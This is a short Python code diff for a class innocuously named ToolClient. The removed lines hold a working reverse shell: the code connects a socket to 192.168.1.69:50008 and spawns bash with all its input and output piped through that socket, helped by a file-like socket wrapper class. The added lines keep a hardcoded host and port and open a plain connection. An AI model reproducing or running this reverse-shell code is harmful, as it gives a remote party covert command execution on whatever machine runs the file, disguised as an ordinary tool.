@@ -1,26 +1,17 @@
 from tkinter import *
-from socket import *
+import socket
 import subprocess
+
+host = "192.168.1.69"
+port = 8888
 
 class ToolClient:
     def __init__(self):
-        s = MySocket()
-        s.connect(('192.168.1.69', 50008))
-        subprocess.Popen('bash', stdout=s, stdin=s, stderr=s).wait()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((host, port))
 
 
-class MySocket(socket):
-    def __init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None):
-        socket.__init__(self, family=AF_INET, type=SOCK_STREAM, proto=0, _sock=None)
 
-    def write(self, text):
-        return self.send(text)
-
-    def readlines(self):
-        return self.recv(2048)
-
-    def read(self):
-        return self.recv(1024)
 
 
 if __name__ == "__main__":
